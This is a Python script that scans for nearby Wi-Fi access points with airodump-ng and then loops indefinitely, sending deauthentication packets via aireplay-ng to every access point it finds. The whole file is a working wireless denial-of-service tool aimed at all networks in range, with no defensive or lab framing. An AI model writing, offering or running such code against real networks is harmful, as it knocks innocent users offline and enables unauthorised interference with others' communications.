import subprocess
import time
from scapy.all import *

def start_monitor_mode(interface):
    subprocess.run(['sudo', 'airmon-ng', 'start', interface])

def stop_monitor_mode(interface):
    subprocess.run(['sudo', 'airmon-ng', 'stop', interface])

def scan_aps(interface, duration=10):
    # Run airodump-ng for a short time to capture APs
    proc = subprocess.Popen(['sudo', 'airodump-ng', '--write-interval', '1', '--output-format', 'csv', '-w', 'scan', interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(duration)
    proc.terminate()
    time.sleep(1)
    aps = []
    try:
        with open('scan-01.csv', 'r') as f:
            lines = f.readlines()
            for line in lines:
                if ',' in line:
                    fields = line.split(',')
                    if len(fields) > 13 and fields[0] != 'BSSID' and len(fields[0].strip()) == 17:
                        bssid = fields[0].strip()
                        channel = fields[3].strip()
                        aps.append((bssid, channel))
    except FileNotFoundError:
        pass
    return aps

def deauth_attack(interface, bssid, count=10):
    # Send deauth packets using aireplay-ng
    subprocess.run(['sudo', 'aireplay-ng', '--deauth', str(count), '-a', bssid, interface])

def main(interface=None):
    if not interface:
        interface = 'wlan0'
    monitor_interface = interface + 'mon'

    print("[*] Starting scan on interface", interface)
    print("[*] Press Ctrl+C to stop...")
    
    try:
        print("[*] Scanning for access points...")
        aps = scan_aps(monitor_interface)
        print(f"[*] Found {len(aps)} access points.")

        while True:
            for bssid, channel in aps:
                print(f"[*] Attacking BSSID {bssid} on channel {channel}")
                deauth_attack(monitor_interface, bssid, count=5)
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopping...")
    except Exception as e:
        print(f"\n[!] Error: {str(e)}")

if __name__ == "__main__":
    main()